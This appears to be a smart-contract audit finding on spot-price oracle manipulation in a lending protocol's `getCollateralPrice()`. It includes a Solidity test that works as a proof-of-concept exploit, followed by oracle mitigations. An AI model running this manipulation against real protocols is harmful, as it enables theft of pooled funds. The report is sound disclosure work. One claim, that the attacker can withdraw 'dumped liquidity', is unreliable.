# Spot Price Oracle Manipulation in `getCollateralPrice()` Allows Attacker to Drain Lending Protocol

**Severity:** High

## Root Cause

`getCollateralPrice()` reads `reserve0`/`reserve1` directly from a UniswapV2 pair as a spot price. Uniswap V2 spot prices can be manipulated within a single transaction by anyone with sufficient capital. No TWAP or external price feed is used.

## Impact

An attacker can manipulate the collateral price by up to **110x** in a single transaction. This allows them to borrow far beyond their actual collateral value, draining the protocol.

**Demonstrated Loss:** $1,949,360 against only $17,721 of legitimate borrowing power. The protocol becomes insolvent.

## Proof of Concept

**Attack Scenario:**

- ETH price before: **$2,362**
- ETH price during attack: **$259,914**
- Max borrow before: **$17,721**
- USDC stolen: **$1,949,360**

By dumping a large amount of USDC into the Uniswap pool used as an oracle, the attacker artificially inflates the price of WETH in USDC terms, dramatically increasing their borrowing power. After borrowing, they can withdraw the dumped liquidity.

### Proof of Code

```solidity
function testOracleManipulation() public {
    (uint112 r0, uint112 r1,) = pair.getReserves();

    // Step 1: deposit collateral
    weth.approve(address(lendingProtocol), 10e18);
    lendingProtocol.depositCollateral(10e18);

    // Step 2: log price before
    uint priceBefore = lendingProtocol.getCollateralPrice();
    console.log("ETH price before:", priceBefore / 1e6, "USDC");

    uint maxBorrowBefore = (10 * priceBefore) * 75 / 100;
    console.log("Max borrow before:", maxBorrowBefore / 1e6, "USDC");

    // Step 3: manipulate price — dump USDC into pool to drain WETH
    uint usdcDump = uint(r0) * 10; // dump 10x current USDC reserves
    deal(address(usdc), address(this), usdcDump);
    usdc.transfer(address(pair), usdcDump);

    // swap — send USDC in, get WETH out
    pair.swap(0, uint(r1) * 90 / 100, address(this), "");

    // Step 4: read manipulated price
    uint priceAfter = lendingProtocol.getCollateralPrice();
    console.log("ETH price DURING attack:", priceAfter / 1e6, "USDC");

    uint maxBorrowAfter = (10 * priceAfter) * 75 / 100;
    console.log("Max borrow after manipulation:", maxBorrowAfter / 1e6, "USDC");

    // Step 5: exploit lending protocol at manipulated price
    lendingProtocol.borrow(maxBorrowAfter);

    // Step 6: log profit
    uint usdcBalance = usdc.balanceOf(address(this));
    console.log("USDC stolen:", usdcBalance / 1e6);
}

```

## Recommendation
Replace the spot price oracle in getCollateralPrice() with one of the following:

Chainlink Price Feed (Recommended) — Most reliable and manipulation-resistant:solidityAggregatorV3Interface feed = AggregatorV3Interface(chainlinkFeed);
(, int price,,,) = feed.latestRoundData();

Uniswap V2 TWAP — Use cumulative price accumulators over a minimum 30-minute window instead of reading reserves directly.

Multiple Oracle Sources — Cross-reference Chainlink and TWAP, and revert if deviation exceeds a set threshold.
